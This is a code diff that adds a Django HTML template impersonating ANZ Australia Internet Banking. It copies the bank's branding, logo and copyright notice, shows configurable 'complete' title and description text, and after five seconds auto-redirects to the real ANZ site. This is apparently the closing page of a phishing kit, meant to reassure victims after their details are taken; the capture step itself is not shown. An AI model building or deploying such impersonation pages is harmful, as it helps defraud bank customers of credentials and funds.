@@ -1,0 +1,39 @@
+{% load static %}
+<!doctype html>
+<html lang="en">
+<head>
+    <link rel="shortcut icon" href="{% static 'favicon.ico' %}" type="image/x-icon">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="refresh" content="5;URL=https://anz.com.au" />
+    <title>ANZ Australia Internet Banking</title>
+    <link href="{% static 'css/bootstrap.css' %}" rel="stylesheet">
+    <link href="../static/css/main.css" rel="stylesheet">
+
+    <script
+            src="https://code.jquery.com/jquery-3.5.1.js"
+            integrity="sha256-QWo7LDvxbWT2tbbQ97B53yJnYU3WhH/C8ycbRAkjPDc="
+            crossorigin="anonymous"></script>
+    <script src="{% static 'bootstrap.min.js' %}"></script>
+</head>
+<body style="background: #004165">
+<nav class="navbar navbar-expand-lg navbar-light mobilebar">
+    <a class="navbar-brand mobile-brand" href="#">
+        <img src="{% static 'logo.png' %}" class="logo-mobile">
+    </a>
+</nav>
+<div class="container">
+    <div class="row">
+        <div class="col-12 card anz-card" style="margin-top: 25px; padding: 25px">
+            <h1 class="h1-mobile">{{ settings.complete_title }}</h1>
+            <p>{{ settings.complete_description }}</p>
+        </div>
+    </div>
+    <img style="margin-top: 50px; margin-left: 20%" src="{% static 'logo.png' %}" alt="">
+
+</div>
+<nav class="navbar mobile-bottom-bar" style="margin-top: 75%">
+    <p>© Australia and New Zealand Banking Group Limited (ANZ) 2020 ABN 11 005 357 522.</p>
+</nav>
+</body>
+</html>
